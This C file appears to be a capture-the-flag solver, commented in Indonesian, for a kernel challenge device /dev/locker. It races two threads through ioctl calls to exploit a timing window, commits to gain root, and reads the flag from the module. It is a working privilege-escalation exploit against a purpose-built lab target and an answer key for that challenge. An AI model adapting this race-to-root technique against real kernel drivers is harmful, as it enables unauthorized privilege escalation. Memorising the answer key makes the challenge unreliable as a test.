
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <sched.h>

#define DEVICE "/dev/locker"

#define LOCKER_OPEN     _IO('L', 1)
#define LOCKER_SYNC     _IO('L', 2)
#define LOCKER_COMMIT   _IO('L', 3)
#define LOCKER_RESET    _IO('L', 4)
#define LOCKER_GETFLAG  _IOR('L', 5, char[128])

static int fd;
static volatile int sync_success = 0;


/*
 * Thread A:
 * menjalankan LOCKER_OPEN().
 *
 * Di kernel, OPEN:
 *
 *     state   = STATE_READY
 *     pending = 1
 *
 * kemudian sleep 100 ms.
 *
 * Ini memberikan kesempatan Thread B
 * menjalankan LOCKER_SYNC().
 */
static void *open_thread(void *arg)
{
    (void)arg;

    printf("[*] Thread A: LOCKER_OPEN\n");

    int ret = ioctl(fd, LOCKER_OPEN);

    if (ret == 0) {
        printf("[+] Thread A: OPEN berhasil\n");
    } else {
        printf("[-] Thread A: OPEN gagal: %s\n",
               strerror(errno));
    }

    return NULL;
}


/*
 * Thread B:
 * mencoba LOCKER_SYNC().
 *
 * Kita retry karena Thread B bisa berjalan
 * sebelum Thread A masuk ke race window.
 */
static void *sync_thread(void *arg)
{
    (void)arg;

    printf("[*] Thread B: mencoba LOCKER_SYNC...\n");

    for (int i = 0; i < 100000; i++) {

        int ret = ioctl(fd, LOCKER_SYNC);

        if (ret == 0) {

            printf("[+] Thread B: SYNC berhasil!\n");

            sync_success = 1;

            return NULL;
        }

        /*
         * Berikan kesempatan scheduler
         * menjalankan Thread A.
         */
        sched_yield();
    }

    printf("[-] Thread B: SYNC tidak berhasil\n");

    return NULL;
}


int main(void)
{
    pthread_t thread_open;
    pthread_t thread_sync;

    printf("========================================\n");
    printf("        P-Balap Kernel Solver\n");
    printf("========================================\n\n");


    /*
     * Buka /dev/locker.
     */
    printf("[*] Opening %s...\n", DEVICE);

    fd = open(DEVICE, O_RDWR);

    if (fd < 0) {
        perror("open /dev/locker");
        return 1;
    }

    printf("[+] Device opened\n\n");


    /*
     * Reset state challenge.
     *
     * Ini harus dilakukan sebelum race.
     */
    printf("[*] RESET...\n");

    if (ioctl(fd, LOCKER_RESET) < 0) {

        perror("LOCKER_RESET");

        close(fd);
        return 1;
    }

    printf("[+] RESET berhasil\n\n");


    /*
     * Jalankan OPEN dan SYNC secara bersamaan.
     */
    printf("[*] Starting race...\n\n");

    if (pthread_create(
            &thread_open,
            NULL,
            open_thread,
            NULL) != 0) {

        perror("pthread_create");

        close(fd);
        return 1;
    }


    if (pthread_create(
            &thread_sync,
            NULL,
            sync_thread,
            NULL) != 0) {

        perror("pthread_create");

        pthread_join(thread_open, NULL);

        close(fd);
        return 1;
    }


    /*
     * Tunggu kedua thread selesai.
     */
    pthread_join(thread_open, NULL);
    pthread_join(thread_sync, NULL);

    printf("\n");


    /*
     * SYNC harus berhasil.
     *
     * Setelah Thread A keluar dari sleep:
     *
     *     sequence == 1
     *
     * sehingga:
     *
     *     state = STATE_GRANTED
     */
    if (!sync_success) {

        printf("[-] Race gagal.\n");

        close(fd);
        return 1;
    }

    printf("[+] Race berhasil!\n");


    /*
     * Tahap terakhir exploit.
     */
    printf("[*] Mencoba LOCKER_COMMIT...\n");

    if (ioctl(fd, LOCKER_COMMIT) < 0) {

        perror("LOCKER_COMMIT");

        close(fd);
        return 1;
    }

    printf("[+] COMMIT berhasil!\n\n");


    /*
     * LOCKER_COMMIT seharusnya memberikan
     * credential root.
     */
    printf("[*] UID sekarang: %d\n", getuid());
    printf("[*] EUID sekarang: %d\n", geteuid());

    if (geteuid() != 0) {

        printf("[-] Belum menjadi root.\n");

        close(fd);
        return 1;
    }

    printf("[+] Berhasil menjadi root!\n\n");


    /*
     * Ambil flag melalui kernel module.
     *
     * TIDAK membaca /flag.txt.
     *
     * Kernel akan:
     *
     *     1. memeriksa solved == true
     *     2. memeriksa EUID == 0
     *     3. melakukan XOR decode
     *     4. copy flag ke buffer ini
     */
    char flag[128] = {0};

    printf("[*] Mengambil flag melalui LOCKER_GETFLAG...\n");

    int ret = ioctl(fd, LOCKER_GETFLAG, flag);

    if (ret < 0) {

        perror("LOCKER_GETFLAG");

        close(fd);
        return 1;
    }


    /*
     * Tampilkan flag.
     */
    printf("[+] FLAG:\n");
    printf("%s\n", flag);


    close(fd);

    printf("\n[*] Solver selesai.\n");

    return 0;
}
